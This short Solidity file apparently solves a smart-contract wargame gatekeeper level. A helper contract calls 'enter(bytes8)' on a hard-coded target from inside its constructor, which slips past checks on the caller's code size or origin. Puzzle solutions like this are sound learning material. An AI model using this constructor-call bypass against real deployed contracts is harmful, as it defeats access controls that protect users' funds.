// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bullet {
    constructor(bytes8 _gateKey) {
        address target = 0xd9145CCE52D386f254917e481eB44e9943F39138;
        target.call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
    }
}

contract AK47 {
    function shoot(bytes8 _gateKey) external {
        Bullet bullet = new Bullet(_gateKey);
    }
}

